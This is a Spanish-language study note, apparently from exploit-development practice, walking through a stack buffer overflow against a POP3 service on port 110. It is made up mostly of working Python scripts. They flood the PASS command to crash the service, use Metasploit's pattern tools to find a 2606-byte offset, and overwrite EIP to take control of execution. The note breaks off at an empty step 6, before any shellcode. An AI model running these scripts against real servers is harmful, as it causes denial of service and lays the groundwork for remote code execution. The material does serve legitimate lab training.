# Buffer Overflow

Tags: #BufferOverflow 

## Explotación

```bash
❯ python exploit.py <IP>
```

```python
1. Crear una DoS y sobrescribir '41414141 = AAAA' en el registro EIP

#!/usr/bin/python 
#coding: utf-8

from pwn import *
import socket, sys

if len(sys.argv) < 2:
	print "\n[!] Uso: python " + sys.argv[0] + " <ip-address>\n"
	sys.exit(0)

# Variables globales
ip_address = sys.argv[1]
rport = 110

if __name__ == '__main__':
	buffer = ["A"]
	contador = 350

	while len(buffer) < 32:
		buffer.append("A"*contador)
		contador += 350

	p1 = log.progress("Data")

	for strings in buffer:
		try:
			p1.status("Enviando %s bytes" % len(strings))
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip_address, rport))
			
			s.recv(1024)
			
			s.send("USER Omar\r\n")
			s.recv(1024)
			s.send("PASS " + strings + '\r\n')
			s.recv(1024)
			s.close()
		except:
			print "\n[!] Ha habido un error de conexion\n"
			sys.exit(1)
```

```bash 
2. Utilidad para crear bytes con caracteres aleatorios 
❯ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
```

```python
3. Necesitamos saber el offset 'Tamaño' para inyectar en el registro EIP y tomar el control 

#!/usr/bin/python 
#coding: utf-8

from pwn import *
import socket, sys

if len(sys.argv) < 2:
	print "\n[!] Uso: python " + sys.argv[0] + " <ip-address>\n"
	sys.exit(0)

# Variables globales
ip_address = sys.argv[1]
rport = 110

if __name__ == '__main__':
	buffer = ""
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip_address, rport))
		
		s.recv(1024)
		
		s.send("USER Omar\r\n")
		s.recv(1024)
		s.send("PASS " + buffer + '\r\n')
		s.recv(1024)
		s.close()
	except:
		print "\n[!] Ha habido un error de conexion\n"
		sys.exit(1)
```

```bash 
4. Miramos el valor en el registro EIP y lo colocamos en la utilidad del Metasploit para conocer el 'Offset' antes de sobrescribir en la EIP
❯ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
# Nos regresa un valor exacto de 'offset' de 2606 (Este valor cambia dependiendo el Buffer)
```

```python 
5. Tomar el control del registro 'EIP', haciendo que nos coloque cuatro "B" = '42424242' y despues escribimos en el registro 'ESP' o sea en la 'pila' con quinientas "C"

#!/usr/bin/python 
#coding: utf-8

from pwn import *
import socket, sys

if len(sys.argv) < 2:
	print "\n[!] Uso: python " + sys.argv[0] + " <ip-address>\n"
	sys.exit(0)

# Variables globales
ip_address = sys.argv[1]
rport = 110

if __name__ == '__main__':
	buffer = "A"*2606 + "B"*4 + "C"*500
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip_address, rport))
		
		s.recv(1024)
		
		s.send("USER Omar\r\n")
		s.recv(1024)
		s.send("PASS " + buffer + '\r\n')
		s.recv(1024)
		s.close()
	except:
		print "\n[!] Ha habido un error de conexion\n"
		sys.exit(1)
```

```python
6. Ahora debemos de hacer que el registro 'EIP' apunte al registro 'ESP'


```